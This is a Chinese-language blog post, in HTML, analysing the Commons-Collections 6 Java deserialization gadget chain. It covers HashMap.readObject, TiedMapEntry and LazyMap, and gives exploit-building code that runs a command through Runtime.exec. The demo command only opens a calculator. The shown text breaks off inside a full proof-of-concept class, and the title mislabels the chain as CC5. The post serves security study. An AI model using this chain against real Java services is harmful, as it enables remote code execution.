@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="CC6这个链是CC里面最为通用的一个，这里还是拿出来分析一下，其实整体跟CC1没多大变化，主要是调用readObject，与URLDNS那条链倒是比较相似。 利用链12345678910111213&#x2F;* Gadget chain:     java.io.ObjectInputStream.readObject()     java.util.HashMap.readObject()     ja">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Commons-Collections5利用链分析">
+<meta property="og:url" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="Shear1n&#39;s Blog">
+<meta property="og:description" content="CC6这个链是CC里面最为通用的一个，这里还是拿出来分析一下，其实整体跟CC1没多大变化，主要是调用readObject，与URLDNS那条链倒是比较相似。 利用链12345678910111213&#x2F;* Gadget chain:     java.io.ObjectInputStream.readObject()     java.util.HashMap.readObject()     ja">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095713630.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095159633.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095326053.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100719937.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100638926.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123103249619.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123104501759.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123104438239.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100638926.png">
+<meta property="og:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123110055451.png">
+<meta property="article:published_time" content="2024-01-18T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-01-23T03:06:51.509Z">
+<meta property="article:author" content="Shear1n">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095713630.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Commons-Collections5利用链分析</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2024/01/18/Commons-Collections1%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&text=Commons-Collections5利用链分析"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&is_video=false&description=Commons-Collections5利用链分析"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Commons-Collections5利用链分析&body=Check out this article: https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&title=Commons-Collections5利用链分析"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&name=Commons-Collections5利用链分析&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://shear1n.github.io/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/&t=Commons-Collections5利用链分析"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.</span> <span class="toc-text">CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">1.1.</span> <span class="toc-text">利用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TiedMapEntry"><span class="toc-number">1.2.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0Gadget"><span class="toc-number">1.3.</span> <span class="toc-text">构造Gadget</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Map-remove"><span class="toc-number">1.4.</span> <span class="toc-text">Map.remove</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%93%E8%AF%AD"><span class="toc-number">1.5.</span> <span class="toc-text">结语</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Commons-Collections5利用链分析
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Shear1n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-01-18T16:00:00.000Z" class="dt-published" itemprop="datePublished">2024-01-19</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h2><p>这个链是CC里面最为通用的一个，这里还是拿出来分析一下，其实整体跟CC1没多大变化，主要是调用readObject，与URLDNS那条链倒是比较相似。</p>
+<h3 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Gadget chain:</span></span><br><span class="line"><span class="comment">     java.io.ObjectInputStream.readObject()</span></span><br><span class="line"><span class="comment">     java.util.HashMap.readObject()</span></span><br><span class="line"><span class="comment">     java.util.HashMap.hash()</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">            org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">                org.apache.commons.collections.map.LazyMap.get()</span></span><br><span class="line"><span class="comment">                    org.apache.commons.collections.functors.ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">                        org.apache.commons.collections.functors.InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                            java.lang.reflect.Method.invoke()</span></span><br><span class="line"><span class="comment">                                java.lang.Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看出来，后半部分并没有变化，主要是前面，用的是HashMap的readObject，而不是AnnotationInvocationHandler.readObject，这也是CC6这条链通用的地方，因为Jdk8u71以后AnnotationInvocationHandler.readObject中的逻辑发生了变化，导致不可用，而这条链就解决了这个问题，利用的HashMap则更通用，适用于JDK7、8全版本。</p>
+<h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p>解决Java高版本利用问题，实际上就是找到其他调用LazyMap.get()的地方，ysoserial的作者这里就找到了一个类，是<code>org.apache.commons.collections.keyvalue.TiedMapEntry</code></p>
+<p><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095713630.png" alt="image-20240123095713630"></p>
+<p>根据利用链，主要看LazyMap.get()之前的，注意到<code>TiedMapEntry</code>，调用了<code>hashCode</code>方法，定位一下代码<br><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095159633.png" alt="image-20240123095159633"></p>
+<p>看到这里调用的hashCode方法里面又调用了<code>getValue()</code>，看一下这个地方<br><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123095326053.png" alt="image-20240123095326053"></p>
+<p>看到这里就很明显了，走到了get方法，map可控，后面把这里改成LazyMap即可。<br>所以，再往后找，想要触发LazyMap.get，就要找哪里调用了TiedMapEntry#hashCode方法。<br>这里就不写弯子了，实际上就是<code>java.util.HashMap.hash</code>，看一下这里<br><code>java.util.HashMap</code>这里的hash方法调用了hashCode，而它的readObject方法直接就调用了hash方法</p>
+<p><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100719937.png" alt="image-20240123100719937"></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">     <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">     s.defaultReadObject();</span><br><span class="line">     reinitialize();</span><br><span class="line">     <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                          loadFactor);</span><br><span class="line">     s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">     <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">         <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">             <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                 <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">             putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们只需要让这个key等于TiedMapEntry对象，即可连接上之前分析过的利用链，所以就是<code>java.util.HashMap#readObject -&gt; HashMap#hash(key) -&gt; TiedMapEntry#hashCode()</code><br>(ysoserial中的调用是：利⽤<code>java.util.HashSet#readObject</code>到<code>HashMap#put()</code>到<code>HashMap#hash(key)</code>最后到<code>TiedMapEntry#hashCode()</code>。)<br>实际上这里还有一个调用hash的地方，这也是一个坑点，后面会说它的作用</p>
+<p><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100638926.png" alt="image-20240123100638926"></p>
+<h3 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h3><p>先把恶意的LazyMap构造出来，这部分跟之前的都一样</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(faketransformers);</span><br><span class="line"></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br></pre></td></tr></table></figure>
+
+<p>这里多写了一个没什么意义的faketransformers，目的是为了防止本地调试时触发命令执行，等到最后生成payload的时候再把真正的transformers传进去。<br>现在根据上面的代码，已经生成了一个恶意的lazymap对象，然后我把这个对象传给TiedMapEntry，作为它的map属性。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;keykey&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>接着，按照我上面所说，我们要调用TiedMapEntry#hashCode()，这里就需要把<code>tiedMapEntry</code>对象作为HashMap的一个key。新建一个HashMap对象：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">//执行序列化的时候，这里的put方法里面直接就会调用hash方法，以至于流程就从这走出去了。</span></span><br><span class="line">expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>最后，这里就可以将expMap作为对象进行序列化了，记得将真正的transformers传进来。<br>这里获取transformer对象，用LazyMap、ChainedTransformer都可以，注意需要通过反射调用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//反射</span></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> ChainedTransformer.class;<span class="comment">//LazyMap.class</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);<span class="comment">//factory</span></span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer,transformers);<span class="comment">//字段赋值</span></span><br><span class="line"></span><br><span class="line">serializable(expMap);</span><br><span class="line">unserializable(<span class="string">&quot;ser6.bin&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>执行一下<br><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123103249619.png" alt="image-20240123103249619"></p>
+<p>但这里没有执行弹计算器的命令！为什么？</p>
+<h3 id="Map-remove"><a href="#Map-remove" class="headerlink" title="Map.remove"></a>Map.remove</h3><p>我们可以在这个地方下个断点，跟进去看一下<br><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123104501759.png" alt="image-20240123104501759"><br>一直走到LazyMap.get()这里</p>
+<p><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123104438239.png" alt="image-20240123104438239">发现这个key是有值的，我们想要进入到命令执行的transform方法，但是这一处的if判断就进不去，因为map.containsKey(key)的结果是true。<br>这就很奇怪了，我们代码写的是<code>expMap.put(tiedMapEntry,&quot;bbb&quot;);</code>，并没有放key是keykey的对象，看下之前的代码，唯一出现过keykey的地方就是<code>TiedMapEntry</code>的构造函数里。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">TiedMapEntry tiedMapEntry= <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="string">&quot;keykey&quot;</span>);</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">expMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">expMap.put(tiedMapEntry,<span class="string">&quot;bbb&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>但既然问题出现了，肯定是有原因的，那怎么是给expMap的key放了个keykey呢，问题也肯定出现在expMap，就是<code>expMap.put</code>这里<br>这就提到了上面寻找hashCode调用的时候，出现的HashMap#put方法<br><img src="/2024/01/19/Commons-Collections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/image-20240123100638926.png" alt="image-20240123100638926"></p>
+<p>也就是说，这里的put方法也有调用hash(key)，这就导致了LazyMap这个利用链在这里又被调用了一遍，因为前面使用的是faketransformers，所以这里并没有触发命令执行。<br>解决方法：使用lazymap.remove移除掉这个key即可，就是让后面执行get的时候通过if判断即可。下面是完整的利用POC</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.shear1n;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections6</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] faketransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span 